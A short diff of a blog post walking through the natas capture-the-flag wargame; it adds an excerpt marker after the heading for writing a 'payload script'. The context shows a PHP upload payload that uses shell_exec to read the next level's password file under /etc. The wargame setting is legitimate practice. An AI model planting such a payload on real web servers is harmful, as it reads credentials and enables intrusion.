@@ -7,7 +7,7 @@ author: Nate
 ---
 
 ## Step 1: Write the "payload script"
-Create a php file to display the natas13 password
+Create a php file to display the natas13 password<!--break-->
 {% highlight php linenos %}
 <?php
 $password = shell_exec("cat /etc/natas_webpass/natas13");
